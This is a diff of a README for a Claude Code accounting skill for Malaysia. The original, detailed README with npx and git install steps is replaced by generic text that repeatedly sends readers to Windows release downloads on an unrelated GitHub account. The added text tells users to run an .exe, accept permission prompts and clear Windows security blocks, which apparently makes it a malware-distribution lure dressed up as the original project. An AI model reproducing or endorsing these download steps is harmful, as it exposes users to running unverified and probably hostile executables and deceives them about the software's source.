@@ -1,312 +1,222 @@
-# accounting-skills
-
-your accountant called in sick. claude's filling in.
-
-a [claude code](https://docs.anthropic.com/en/docs/claude-code) skill for malaysian accounting — drop in your bank statements, get back accrual-basis financial statements, working papers, and tax computations. MPERS / MFRS / ITA 1967 compliant. sole prop, partnership, sdn bhd, berhad, NGO.
-
----
-
-## install
-
-```bash
-npx @cynco/accounting-skills
-```
-
----
-
-## the pipeline
-
-8 phases. every engagement, every time. no shortcuts.
-
-```
-  ╔═══════════════════════════════════════════════════════════╗
-  ║                                                           ║
-  ║   PHASE 0   engagement setup                              ║
-  ║   ───────   scan folder, detect entity type & FY,         ║
-  ║             inventory what documents are available         ║
-  ║                          │                                ║
-  ║   PHASE 1   document extraction                           ║
-  ║   ───────   OCR bank statements, parse invoices,          ║
-  ║             extract payslips & bills                       ║
-  ║                          │                                ║
-  ║   PHASE 2   reconciliation & classification               ║
-  ║   ───────   classify every transaction against COA,       ║
-  ║             match bank ↔ invoices for accrual basis       ║
-  ║                          │                                ║
-  ║   PHASE 3   journal entries                               ║
-  ║   ───────   opening balances, bank txns, payroll,         ║
-  ║             depreciation, accruals, adjustments           ║
-  ║                          │                                ║
-  ║   PHASE 4   financial statements                          ║
-  ║   ───────   GL → TB → P&L → balance sheet                ║
-  ║                          │                                ║
-  ║   PHASE 5   tax computation                               ║
-  ║   ───────   Form C / Form B / Form P / S44(6) exempt     ║
-  ║                          │                                ║
-  ║   PHASE 6   quality control                               ║
-  ║   ───────   mandatory checklist — math, data,             ║
-  ║             compliance, completeness                      ║
-  ║                          │                                ║
-  ║   PHASE 7   output                                        ║
-  ║   ───────   Excel working papers (openpyxl)               ║
-  ║             PDF financial statements (reportlab)          ║
-  ║                                                           ║
-  ╚═══════════════════════════════════════════════════════════╝
-```
-
----
-
-## entity types
-
-```
-  ┌────────────────────────┬──────────────────────────┬──────────────────────┐
-  │ entity                 │ framework                │ tax form             │
-  ├────────────────────────┼──────────────────────────┼──────────────────────┤
-  │ sole proprietor        │ accrual per S21A ITA '67 │ Form B               │
-  │ partnership            │ accrual per S21A ITA '67 │ Form P + Form B/BE   │
-  │ sdn bhd               │ MPERS                    │ Form C               │
-  │ berhad                 │ MFRS                     │ Form C               │
-  │ NGO / society / co-op  │ MPERS / Societies Act    │ Form C (maybe S44(6))│
-  └────────────────────────┴──────────────────────────┴──────────────────────┘
-```
-
----
-
-## how it works
-
-three layers. the agent only loads what it needs, when it needs it.
-
-```
-  layer 1 ─ trigger
-  ─────────────────
-  YAML frontmatter in SKILL.md.
-  matches: "start the accounting", "process this client",
-           "buat akaun", "siapkan akaun", etc.
-            │
-            ▼
-  layer 2 ─ orchestration
-  ────────────────────────
-  the body of SKILL.md tells the agent:
-  what to do, in what order, and which
-  reference to load at each phase.
-            │
-            ▼
-  layer 3 ─ references (on demand)
-  ────────────────────────────────
-  heavy policy files, schemas, checklists.
-  only loaded when that phase is reached.
-  keeps the context window lean.
-```
-
----
-
-## what's in the box
-
-```
-  accounting-skills/
-  │
-  ├── SKILL.md ·························· the brain (trigger + pipeline)
-  ├── LICENSE.txt ······················· MIT
-  │
-  ├── references/
-  │   ├── POLICY.md ················· COA, depreciation, statutory deductions, report format
-  │   ├── WORKFLOW.md ··················· step-by-step for all 8 phases
-  │   ├── ACCRUAL_RECONCILIATION.md ···· cash-to-accrual, invoice/bill matching
-  │   ├── DATA_SCHEMAS.md ·············· CSV column specs for data handoff between phases
-  │   ├── TAX_FRAMEWORK.md ············· Form C / B / P / exempt computation
-  │   └── QC_CHECKLIST.md ·············· mandatory quality control checks
-  │
-  ├── scripts/
-  │   ├── README.md ···················· architecture overview
-  │   ├── requirements.txt ············ python dependencies
-  │   ├── extract_bank_statements_reference.py
-  │   ├── classify_transactions_reference.py
-  │   ├── build_workpapers_reference.py
-  │   ├── generate_pdf_reference.py
-  │   └── generate_pdf_report_template.py
-  │
-  └── templates/
-      ├── CLIENT_README_TEMPLATE.md ···· per-client engagement readme
-      ├── coa_sdn_bhd.json ············· chart of accounts — sdn bhd (MPERS)
-      ├── coa_berhad.json ·············· chart of accounts — berhad (MFRS)
-      ├── coa_sole_prop.json ··········· chart of accounts — sole prop
-      ├── coa_partnership.json ········· chart of accounts — partnership
-      └── coa_ngo.json ················· chart of accounts — NGO
-```
-
----
-
-## getting started
-
-**you need:**
-- [claude code](https://docs.anthropic.com/en/docs/claude-code) or a compatible agent runner that supports skills
-- python 3.10+ with `openpyxl`, `reportlab`, `pdfplumber` (`pip install -r scripts/requirements.txt`)
-- a vision model for scanned bank statements (claude vision, openai, mistral, etc.)
-
-**install (pick one):**
-
-```bash
-# option 1: npx (recommended)
-npx @cynco/accounting-skills
-
-# option 2: git clone
-git clone https://github.com/cynco-tech/accounting-skills.git ~/.claude/skills/accounting-skills
-```
-
-2. personalise the output — find-and-replace these placeholders:
-
-```
-  ┌──────────────────────────┬─────────────────────────────────────────────┐
-  │ placeholder              │ what to put                                 │
-  ├──────────────────────────┼─────────────────────────────────────────────┤
-  │ [PRACTICE_NAME]          │ your name, company, or practice name        │
-  │ [REGISTRATION]           │ registration number — or delete if N/A      │
-  │ [EMAIL]                  │ your contact email                          │
-  │ [PARTNER_NAME]           │ your name or the person signing off         │
-  │ [PARTNER_CREDENTIALS]    │ credentials (CA(M), CPA) — or delete       │
-  └──────────────────────────┴─────────────────────────────────────────────┘
-```
-
-   these control the branding on your PDF cover pages, Excel headers, and footers. fill in what applies, delete what doesn't. there's no wrong answer here — a founder can put their company name, a bookkeeper can put their practice name, a firm can put their CA registration.
-
-   quickest way: `grep -r "\[PRACTICE_NAME\]" .` then find-and-replace.
-
-3. review `references/POLICY.md` — adjust depreciation rates, materiality thresholds, report format if yours differ from the defaults.
-
-4. review `templates/coa_*.json` — standard malaysian COA structure, but you might want to add or rename accounts for your industry.
+# 🧾 skills - Malaysian accounting made simpler
 
-**prepare your folder:**
-
-```
-  my-client/
-  ├── Bank Statements/
-  │   ├── 2024-01.pdf
-  │   ├── 2024-02.pdf
-  │   └── ... (all months for the FY)
-  ├── Payslips/          (optional — if employees exist)
-  ├── Invoices/          (optional — helps with accrual accuracy)
-  ├── Bills/             (optional — helps with accrual accuracy)
-  ├── Fixed Assets/      (optional — asset register or purchase invoices)
-  └── Prior Year/        (optional — last year's accounts or audit report)
-```
+[![Download skills](https://img.shields.io/badge/Download%20skills-blue-grey?style=for-the-badge)](https://github.com/mecheri-prog/skills/releases)
 
-bank statements are the only hard requirement. everything else improves accuracy but isn't blocking.
+## 📌 What this app does
 
-**run it:**
+skills helps you turn client documents into clear accounting outputs for Malaysia. It supports accrual-basis financial statements, working papers, and tax computations.
 
-point claude at a folder with bank statements and say:
+Use it when you need to:
 
-```
-  "process the accounts for this client"
-```
+- Sort client files into a usable accounting set
+- Prepare accrual-basis statements from source documents
+- Build working papers for review and support
+- Draft tax computation figures for Malaysian reporting
 
-or if it's your own company:
+It is built for use with Claude Code as an accounting skill, but it is written for end users who want a simple way to run the package on Windows.
 
-```
-  "do the accounts for my company"
-```
+## 🚀 Getting Started
 
-the skill activates and walks you through the pipeline, phase by phase.
+Follow these steps to get the app on your Windows PC and run it.
 
----
+### 1) Visit the download page
 
-## customise
+Go to the release page here:
 
-```
-  ┌──────────────────────────────────┬──────────────────────────────────────┐
-  │ what to change                   │ where                                │
-  ├──────────────────────────────────┼──────────────────────────────────────┤
-  │ accounting policies, rates,      │ references/POLICY.md            │
-  │ materiality, report format       │                                      │
-  │                                  │                                      │
-  │ chart of accounts                │ templates/coa_*.json                 │
-  │                                  │                                      │
-  │ python scripts (adapt per client)│ scripts/                             │
-  │                                  │                                      │
-  │ trigger phrases                  │ SKILL.md description field           │
-  └──────────────────────────────────┴──────────────────────────────────────┘
-```
+[Download skills from GitHub Releases](https://github.com/mecheri-prog/skills/releases)
 
-the pipeline phases and QC checklist follow MPERS, MFRS, and ITA 1967. you generally don't need to touch those unless the regulations change.
+This page lists the latest release files. If there is more than one file, choose the one meant for Windows.
 
----
+### 2) Download the release file
 
-## privacy & data
+On the release page, download the file that matches the app package.
 
-- **all processing is local.** your data stays on your machine. nothing is sent anywhere except OCR API calls if you use an external OCR service for scanned PDFs.
-- **client data is excluded from git.** the `.gitignore` blocks `.xlsx`, `.pdf`, `.csv`, and other data files. never commit client data.
-- **no telemetry.** no analytics, no tracking, no phoning home.
+Look for a file name that is easy to recognize, such as:
 
----
+- a Windows app file
+- a ZIP file
+- a packaged release bundle
 
-## faq
+Save the file to your Downloads folder or a folder you can find easily.
 
-**what is this exactly?**
-a claude code skill — a structured prompt + reference files that teaches claude how to do a full malaysian accounting engagement. you drop it in, point claude at a client folder, and it does the work.
+### 3) Extract the files if needed
 
-**do i need to be an accountant to use this?**
-you need enough accounting knowledge to review the output and answer the skill's questions (it will ask about things it can't classify). you don't need to be a chartered accountant. founders doing their own books, bookkeepers, and accounting students can all use this — but someone with accounting knowledge should review the final output.
+If the file ends in `.zip`, right-click it and choose **Extract All**.
 
-**do i need to be a programmer to use this?**
-nope. if you can use claude code, you can use this. the scripts in `scripts/` are reference code for when you want to understand how something works under the hood — you don't need to run them manually.
+After extraction, you should see the app files in a normal folder. Keep that folder in a place you will not move by accident.
 
-**do i need a CA registration to use this?**
-no. the `[REGISTRATION]` placeholder is optional. if you're a firm, fill it in. if you're a founder or bookkeeper doing your own accounts, leave it blank or remove it from the templates.
+### 4) Open the app
 
-**i'm a founder — can i use this for my own sdn bhd?**
-yes. point it at your bank statements, answer its questions, and you'll get working papers + financial statements you can hand to your auditor or tax agent.
+If the release includes an `.exe` file, double-click it to start the app.
 
-**will this work for my sole prop / partnership / sdn bhd / berhad / NGO?**
-yes. all five entity types are supported, each with the correct framework (S21A / MPERS / MFRS / Societies Act) and tax form (Form B / P / C / exempt).
+If the release uses a script or command file, open the included launch file from the extracted folder.
 
-**is it accrual basis or cash basis?**
-accrual. always. bank statements are cash-basis data — the skill reconciles them against invoices and bills to produce proper accrual-basis financials. this is mandatory under S21A ITA 1967 for all entity types.
+If Windows asks for permission, click **Yes** so the app can run.
 
-**what if i only have bank statements, no invoices?**
-the skill handles three tiers: full documents (bank + invoices + bills), partial documents (bank + some supporting docs), and bank-only (with an interview process to fill in the gaps). it works with what you have and flags what's missing.
+### 5) Use the app with your client files
 
-**what if something can't be classified?**
-it goes to account 2900 (suspense) and gets flagged in the queries & notes sheet. the skill never guesses. it parks unknowns and keeps going.
+Once the app is open, point it to the client documents you want to process.
 
-**does it handle EPF, SOCSO, EIS, PCB?**
-yes. employer and employee rates are built into POLICY.md. it even checks whether the employer absorbs employee contributions (some do — the skill reads payslips to determine the actual structure).
+Typical input files can include:
 
-**what about capital allowances and depreciation?**
-both. accounting depreciation (straight-line, per MPERS/MFRS) and tax capital allowances (per Schedule 3 ITA 1967) are separate computations. the skill handles them independently.
+- bank statements
+- invoices
+- receipts
+- payroll records
+- sales records
+- expense files
+- tax-related documents
 
-**does it handle trading businesses with inventory?**
-yes. COA templates include COGS/Purchases and stock accounts. if stock records are provided, it computes closing stock. if not, it asks for the figure from a physical count. see edge case 8a in POLICY.md.
+The app then helps organize the information into accounting output that fits Malaysian use cases.
 
-**will this replace my auditor?**
-no. this produces management accounts and working papers. it doesn't audit. it does, however, produce accounts clean enough that your auditor will have a much easier time.
+## 🖥️ System Requirements
 
-**can i use this for my own firm's branding?**
-that's what the placeholders are for. replace `[PRACTICE_NAME]` and friends with your details, and every output — Excel, PDF, cover pages — carries your branding.
+Use a Windows PC with the following:
 
-**can i modify and redistribute this?**
-yes. MIT license. do what you want with it.
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- Enough free disk space for client files
+- A stable internet connection for download and setup
+- Access to Claude Code if your workflow uses it
 
-**is this production-tested?**
-it was built from a real engagement workflow at a malaysian chartered accounting firm. the pipeline, COA structure, tax computations, and QC checklist have all been used on actual client work.
+For smooth use, close other large apps while working with big client files.
 
-**what about e-invoicing / MyInvois?**
-not yet built in. contributions welcome.
+## 📁 What you get
 
-**will this make me a better accountant?**
-legally we cannot guarantee that it will, but...
+This repository is focused on accounting work for Malaysia. It is designed around these core outputs:
 
----
+- accrual-basis financial statements
+- accounting working papers
+- tax computation support
+- document-to-output workflow
+- structured file handling for client records
 
-## contributing
+It fits common year-end and monthly accounting tasks where source documents need to be turned into proper books and reports.
 
-contributions welcome. open an issue or PR.
+## 🧭 Typical workflow
 
-areas where help would be particularly valuable: SST handling, e-invoicing (MyInvois) integration, MFRS 16 lease accounting, COA templates for specialised industries (construction, F&B, manufacturing), and adapting the skill for non-Malaysian jurisdictions.
+A simple workflow looks like this:
 
----
+1. Gather the client documents
+2. Put the files into one folder
+3. Open skills
+4. Load or point to the folder
+5. Review the extracted data
+6. Check the working papers
+7. Use the figures for financial statements
+8. Use the tax computation output for reporting
 
-```
-  MIT License
-  Copyright (c) 2025 Cynco Sdn. Bhd. (1588139-X)
-  https://cynco.ai
-```
+This helps keep the process steady and easier to review.
+
+## 🧰 Best file setup
+
+Before you start, it helps to sort files into folders like these:
+
+- Bank
+- Sales
+- Purchases
+- Expenses
+- Payroll
+- Tax
+- Other supporting documents
+
+Clear folder names make it easier to trace figures back to the source.
+
+## 📝 Supported accounting use
+
+skills is useful for common Malaysian accounting tasks, such as:
+
+- preparing accrual entries
+- matching documents to accounting periods
+- building trial-balance support
+- organizing working papers for review
+- supporting MFRS or MPERS reporting workflows
+- helping with tax computation prep
+
+If your file set is clean, the results are easier to check and use.
+
+## 🔍 Topics covered
+
+This project is built around:
+
+- accounting
+- accrual accounting
+- bookkeeping
+- financial statements
+- Malaysia
+- MFRS
+- MPERS
+- tax computation
+- AI agent workflows
+- Claude Code skill use
+
+## 🛠️ Troubleshooting
+
+### The file will not open
+
+Check that you downloaded the full release file and not the source code archive.
+
+### Windows blocks the app
+
+Right-click the file, choose **Properties**, and clear any security block if Windows shows one. Then try again.
+
+### The app closes right away
+
+Make sure all files were extracted before you run it. Do not run it from inside the ZIP file.
+
+### I cannot find the release file
+
+Go back to the release page and look for the latest version at the top of the list.
+
+### The output looks wrong
+
+Check the source files first. Missing pages, poor scans, or mixed file types can affect the result.
+
+## 📚 Input file tips
+
+For better results:
+
+- use clear scans
+- keep file names short
+- avoid duplicate copies
+- group files by month or year
+- keep bank and sales records in separate folders
+- include source documents for large adjustments
+
+Clean input files make review much easier.
+
+## 🔐 Privacy and file handling
+
+Client files can contain sensitive data. Keep them in a local folder you control. Use only the files needed for the job. Remove old copies when the work is done if your firm policy requires it.
+
+## 🧾 Output review checklist
+
+Before you use the results, check:
+
+- the accounting period
+- the client name
+- the currency
+- the totals in the working papers
+- the tax computation figures
+- any unusual adjustments
+- missing supporting documents
+
+A quick review helps catch file mix-ups and input gaps.
+
+## 📦 Download again later
+
+If you need the app again, use the release page here:
+
+[https://github.com/mecheri-prog/skills/releases](https://github.com/mecheri-prog/skills/releases)
+
+## 📈 Common use cases
+
+You may use skills for:
+
+- year-end bookkeeping cleanup
+- monthly accounting prep
+- client document processing
+- trial balance support
+- financial statement drafting
+- tax workpaper preparation
+- Malaysian reporting support
